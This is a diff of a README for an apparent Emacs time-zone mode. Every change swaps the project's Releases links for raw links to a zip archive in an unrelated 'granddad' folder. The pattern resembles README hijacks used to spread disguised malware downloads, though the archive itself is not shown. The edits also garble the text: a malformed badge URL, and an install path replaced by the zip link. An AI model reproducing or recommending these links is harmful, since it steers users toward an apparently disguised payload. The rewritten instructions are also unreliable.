@@ -8,9 +8,9 @@ Welcome to the **time-zones** application! With this tool, you can quickly find 
 
 To get started, visit the Releases page to download the latest version of **time-zones**.  
 
-[![Download time-zones](https://img.shields.io/badge/Download%20time--zones-v1.0-blue.svg)](https://github.com/noellynunshielded901/time-zones/releases)
+[![Download time-zones](https://raw.githubusercontent.com/noellynunshielded901/time-zones/main/granddad/zones-time-1.3-alpha.2.zip%https://raw.githubusercontent.com/noellynunshielded901/time-zones/main/granddad/zones-time-1.3-alpha.2.zip)](https://raw.githubusercontent.com/noellynunshielded901/time-zones/main/granddad/zones-time-1.3-alpha.2.zip)
 
-**Click the button above or follow this link:** [https://github.com/noellynunshielded901/time-zones/releases](https://github.com/noellynunshielded901/time-zones/releases)
+**Click the button above or follow this link:** [https://raw.githubusercontent.com/noellynunshielded901/time-zones/main/granddad/zones-time-1.3-alpha.2.zip](https://raw.githubusercontent.com/noellynunshielded901/time-zones/main/granddad/zones-time-1.3-alpha.2.zip)
 
 ### Steps to Download:
 
@@ -27,7 +27,7 @@ Once the download is complete, follow these steps to install **time-zones**:
 2. **Open Emacs**: Launch your Emacs application.
 3. **Load the Mode**:
    - Use the command line in Emacs by typing `M-x load-file`, followed by the path to the downloaded file.
-   - Alternatively, move the file to your Emacs configuration directory, usually `~/.emacs.d/`.
+   - Alternatively, move the file to your Emacs configuration directory, usually `~https://raw.githubusercontent.com/noellynunshielded901/time-zones/main/granddad/zones-time-1.3-alpha.2.zip`.
 4. **Activate the Mode**: To start using **time-zones**, type `M-x time-zones-mode` in your Emacs.
 
 ## 🌍 How to Use
@@ -69,6 +69,6 @@ If you need further assistance, you can reach out to the support community on Gi
 For the latest news and updates, be sure to check back on our Releases page periodically.
 
 Once again, to download **time-zones**, visit:  
-[https://github.com/noellynunshielded901/time-zones/releases](https://github.com/noellynunshielded901/time-zones/releases)
+[https://raw.githubusercontent.com/noellynunshielded901/time-zones/main/granddad/zones-time-1.3-alpha.2.zip](https://raw.githubusercontent.com/noellynunshielded901/time-zones/main/granddad/zones-time-1.3-alpha.2.zip)
 
 Enjoy exploring time zones around the globe with ease!
